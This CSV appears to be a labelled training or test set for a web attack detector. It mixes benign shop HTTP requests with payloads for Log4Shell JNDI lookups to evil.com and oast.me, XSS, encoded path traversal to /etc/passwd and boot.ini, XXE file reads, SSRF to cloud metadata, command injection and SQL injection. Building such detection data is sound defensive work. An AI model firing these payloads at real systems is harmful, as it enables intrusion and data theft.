payload,label,source
Accept-Language: ${jndi:ldaps://evil.com:8080/payload},log4shell,augmented
"GET http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=7B107A7AFBB7FE8BFF5998F32C5403D9 Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=%253F&precio=39&cantidad=24&B1=A%F1adir+al+carrito HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=6FE2BF1A373594DC70541CA9F674937D Connection: close",sqli,csic_2010
"<optgroup onkeydown=""alert(1)"" contenteditable>test</optgroup>",xss,seclists
../../../../../../../WINNT/php.ini,path_traversal,seclists
%27%3Becho%20QQXBDZ$((99%2B24))$(echo%20QQXBDZ)QQXBDZ%22,command_injection,seclists
X-Api-Version: ${jndi:iiop://oast.me:443/rce},log4shell,augmented
modo=entrar&login=natraj&pwd=desa1a0car%27+DELETE+FROM+USERS&remember=on&B1=Entrar,sqli,csic_2010
/etc/angband/edit/terrain.txt,path_traversal,seclists
%e0%80%ae%e0%80%ae%e0%80%af%e0%80%ae%e0%80%ae%e0%80%af%e0%80%ae%e0%80%ae%e0%80%afetc%e0%80%afpasswd,path_traversal,payloads_all_the_things
"<span onmousedown=""alert(1)"">test</span>",xss,seclists
"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2689&B1=Confirmar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=760F8725C5DCADF776B6B7EA4204C1F6 Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=07580145CB5B30CF77C1AAFE250D9D9C Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=817212EC469E400C28C716CF1F115C85 Connection: close",normal,csic_2010
"PUT http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept:text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:9090 Cookie: JSESSIONID=A49A8372C218FC4EDE135398B6192A9F Content-Type: application/x-www-form-urlencoded Connection: close",sqli,csic_2010
"GET http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=E280D0AEDCF31715B0FB28E6E7B0AE77 Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=EE0242491CC844A3AF2724829D4BD955 Connection: close",normal,csic_2010
"POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=DE09AFB5D666A2A9640EF8852C0BFF8B Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
"POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=767E68ACD912EBFE772F4CF1CDF533A4 Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
.%2e%2f.%2e%2f.%2e%2f.%2e%2f.%2e%2f.%2e%2fetc%2fissue,path_traversal,payloads_all_the_things
C:\Users\All Users\AppData\Local\Temp\dd_setup_20200921070620_300_microsoft.visualstudio.xamldiagnostics.resources.log,path_traversal,seclists
"GET http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=AD00BB4A668F7D2C482EAE7F43F3B21B Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=499BB90DE178EA44A54C7F46618F5CB3 Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=F9B557F57BB28DA0C5239B9F922EEF7F Connection: close",normal,csic_2010
"GET http://localhost:8080.java HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=57889C7DCB3487E9DC5FF323016B947D Connection: close",sqli,csic_2010
C:\Users\All Users\AppData\Local\Temp\dd_setup_20200921070620_091_microsoft.visualstudio.platform.callhierarchy.log,path_traversal,seclists
"POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=A680B682B525CB629A7DBCC4D889D477 Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
C:\Program Files\IceWarp\kaspersky\bin\bases\data\updcfg.xml,path_traversal,seclists
"GET http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=3AE11DAFAC90BCE8791513B99145AD8E Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=D5EFEB0AF0C12E45B181ED191F531E72 Connection: close",normal,csic_2010
id=2%2F&nombre=Vino+Rioja&precio=39&cantidad=70&B1=A%F1adir+al+carrito,sqli,csic_2010
"<style>:target {color:red;}</style><hr id=x style=""transition:color 1s"" ontransitionend=alert(1)></hr>",xss,seclists
../../../../../../../../etc/security/limits%00,path_traversal,seclists
%%c0%6e%c0%6e%c0%5c%%c0%6e%c0%6e%c0%5c%%c0%6e%c0%6e%c0%5c%%c0%6e%c0%6e%c0%5cboot.ini,path_traversal,payloads_all_the_things
/etc/logcheck/ignore.d.workstation/pbbuttonsd,path_traversal,seclists
%fc%80%80%80%80%ae%fc%80%80%80%80%ae/%fc%80%80%80%80%ae%fc%80%80%80%80%ae/%fc%80%80%80%80%ae%fc%80%80%80%80%ae/%fc%80%80%80%80%ae%fc%80%80%80%80%ae/windows/system32/drivers/etc/hosts,path_traversal,payloads_all_the_things
"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=sait&pwd=t20s3da43%F36&remember=on&B1=Entrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=0C281F0ABF711D7577DCB7E0C2E66147 Connection: close",normal,csic_2010
/etc/init.d/nfs-kernel-server,path_traversal,seclists
"GET http://localhost:8080/tienda1/global/estilos.css HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=597C803B4DF8FFE65121C10F4B663158 Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=C63151CA25D322E04949B3D007C2FEA8 Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=E12042F1D859B2FD92D994B62F2112F1 Connection: close",sqli,csic_2010
"GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=FC278DD000685EA919011A31477544C6 Connection: close",normal,csic_2010
"POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=EA64F46B516639C7050313AE95CE028A Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
"POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=4C6DE54704E7A0CA190AF7646125C551 Content-Type: application/x-www-form-urlencoded Connection: close",sqli,csic_2010
"POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=F68CFB375290B8E51CE22CF8CFB0EB32 Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
C:\Windows\windowsupdate.log,path_traversal,seclists
"GET http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=185A53493F5576D4A3430B908775F378 Connection: close",normal,csic_2010
"POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=03EEB5D54EF6C09FF0B174845FEE7BD9 Content-Type: application/x-www-form-urlencoded Connection: close",sqli,csic_2010
load=ftp://169.254.169.254/computeMetadata/v1/,ssrf,augmented
"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=4E97543D507859F8F40ECCDE2DD51743 Connection: close",normal,csic_2010
modo=registro&login=dotty&password=3ar6i383&nombre=Pur%EDsima&apellidos=Mugione+De+Manuel&email=sorci3%40lamola-hotel.gr&dni=24575080V&direccion=C%2F+Animas%2C+101%2C+&ciudad=Magaz+de+Pisuerga&cp=06370&provincia=Toledo&ntc=1251745617275774&B1=Registrar,normal,csic_2010
<bdo onfocusout=alert(1) tabindex=1 id=x></bdo><input autofocus>,xss,seclists
"<meta onclick=""alert(1)"">test</meta>",xss,seclists
"GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2 HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=1AF4C3D9618B27B58189EBE4015195CC Connection: close",sqli,csic_2010
"GET http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=4A5D4B8CCBF0F8392A82B0F054271FE6 Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/global/estilos.css HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=98229A33D94634332027AADC290E6972 Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=D15BB150CD767F667C740053C6DB0F84 Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=C87F2F8171A771FE7C541FE969873126 Connection: close",normal,csic_2010
/etc/httpd/logs/acces_log%00,path_traversal,seclists
/etc/bash_completion.d/darcs,path_traversal,seclists
"GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombreA=Vino+Rioja&precio=85&cantidad=76&B1=A%F1adir+al+carrito HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=0C30C0D8BD1764A41F5004C34333C318 Connection: close",sqli,csic_2010
../../../../../../../../../home/bin/stable/apache/php.ini,path_traversal,seclists
"POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=A0EFCCC3A2963541913BAE0609A16F7C Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5cetc%c0%5cissue,path_traversal,payloads_all_the_things
GET /?load=sftp://fe80::1:53/.env HTTP/1.1,ssrf,augmented
%252e%252e%uEFC8%252e%252e%uEFC8boot.ini,path_traversal,payloads_all_the_things
"<?xml version=""1.0""?><!DOCTYPE foo [<!bar542 bar542 SYSTEM ""netdoc://c:\boot.ini"">]><foo>&bar542;</foo>",xxe,augmented
"<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE foo [<!test29 test29 SYSTEM ""file:///etc/crontab"">]><foo>&test29;</foo>",xxe,augmented
"GET http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=3E0FE099A619E205677F77A3AACAC0EA Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2753&B1=Pasar+por+caja HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=44DD18ADDF28E539C594E0558AC71071 Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=3A57B6B5EC83F90F4B0B0928885FE2D0 Connection: close",normal,csic_2010
..../%252f..../%252f..../%252f..../%252f..../%252fwindows%252fsystem32%252fdrivers%252fetc%252fhosts,path_traversal,payloads_all_the_things
"GET http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=0F5B59706A5A3F134BC5FB31729D6B0A Connection: close",normal,csic_2010
%f8%80%80%80%ae%f8%80%80%80%ae%c1%9c%f8%80%80%80%ae%f8%80%80%80%ae%c1%9cetc%c1%9cissue,path_traversal,payloads_all_the_things
